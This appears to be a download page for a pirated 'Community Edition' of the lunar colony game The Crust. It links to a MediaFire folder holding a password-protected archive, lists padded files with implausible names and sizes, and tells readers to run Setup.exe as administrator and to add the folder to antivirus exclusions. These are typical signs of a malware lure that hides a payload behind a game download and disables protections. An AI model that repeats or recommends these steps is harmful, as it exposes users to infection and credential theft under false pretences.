## 🎮 About the Game

The Crust is a lunar colony simulation in which you build and manage a moon base from a small landing site into a full industrial outpost. Mine regolith, refine minerals, run transport routes, and fulfill contracts with Earth governments while managing crew needs and research. This Community Edition is a standalone, self-contained package with all available content, ready to play immediately offline.

Strategy and simulation players who want a self-contained lunar colony builder playable offline on Windows PCs.

> ℹ️ **This is a standalone community build.** No additional software, storefronts, or online activation required. Just download, extract, and play. Provided for evaluation and archival purposes.

## 📦 Package Features

- 🌕 **Lunar Colony Simulation** — Build and expand a moon outpost across a simulated lunar surface.
- ⛏️ **Regolith Mining** — Extract minerals and water ice from processed lunar soil.
- 🚚 **Transport Logistics** — Route trucks and rovers between mines, silos, and factories.
- 🏭 **Production Chains** — Refine raw ore into components for construction and trade.
- 📈 **Earth Markets** — Sell surplus resources and react to stock market movements.
- 📜 **Contracts & Missions** — Complete orders from world governments and private companies.
- 🔬 **Technology Tree** — Research upgrades that automate and optimize the colony.
- 👨‍🚀 **Astronaut Management** — Keep crew fed, rested, and healthy in harsh lunar conditions.
- 🏗️ **Base Building** — Place solar arrays, habitat modules, and industrial structures.
- 🎯 **Story Campaign** — Follow a narrative of lunar exploration and colonization.
- 💻 **Offline Play** — Fully playable without a storefront or internet connection.
- 📦 **Self-Contained Package** — A single installation with no additional software required.

- **Compression:** Lossless
- **Install Time:** ~6 minutes on SSD, ~15 minutes on HDD

## 📥 Installation & Setup

### Step 1: Download

Download the `Setup.zip` archive from the link below:
- **Download Link:** [https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)

### Step 2: Extract

1. The archive is protected with the password: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.
2. **IMPORTANT:** All files must be extracted to the **same folder** as `Setup.exe`.
3. The folder structure should look like this:

```
Setup/
|-- Setup.exe <- Main executable (6.3 MB)
|-- scripts.lic <- Game scripts (53.6 MB)
|-- patch_1.bnk <- Audio banks (34.5 MB)
|-- res.pak <- Resources archive (10.2 MB)
|-- animations.dll <- Animation system (4.7 MB)
|-- update_1.res <- Update resources (4.5 MB)
|-- api.pak <- API modules (4.3 MB)
|-- settings.bin <- Configuration (4.2 MB)
|-- license.wem <- Audio assets (3.8 MB)
|-- global.cfg <- Global settings (3.7 MB)
|-- assets.wem <- Asset audio (3.6 MB)
|-- physics.sys <- Physics engine (3.2 MB)
|-- dlc.md5 <- DLC checksums (3.2 MB)
|-- launcher.dll <- Launcher library (3.1 MB)
|-- driver.umap <- Driver data (2.7 MB)
|-- installer.dat <- Installer data (2.2 MB)
|-- license.bank <- License data (2.0 MB)
|-- update_1.ini <- Update config (1.9 MB)
|-- driver.pak <- Driver archive (1.6 MB)
|-- localization.ini <- Language files (1.5 MB)
|-- uninstall.key <- Uninstall key (1.1 MB)
|-- bootstrap.wem <- Bootstrap audio (0.9 MB)
|-- lang.sys <- Language system (0.8 MB)
|-- audio.res <- Audio resources (1 KB)
|-- Password 2026.txt <- Password reminder (empty)
```

### Step 4: Launch the Game

1. Navigate to the folder where you extracted all files.
2. Run `Setup.exe`.
3. The game launcher will appear.

### Step 5: Play

1. Click **"Play"** in the launcher window.
2. The game will start with the community build.
3. Enjoy the full experience!

> 💡 **Saves location:** `%LOCALAPPDATA%\TheCrust\Saved`

## 🐛 Troubleshooting

- **Antivirus false positive:** Add the game folder to exclusions.
- **Missing DLLs:** Install Visual C++ Redistributable 2015-2022 and latest DirectX runtime.
- **Game won't start:** Run as administrator, disable fullscreen optimizations, update GPU drivers.
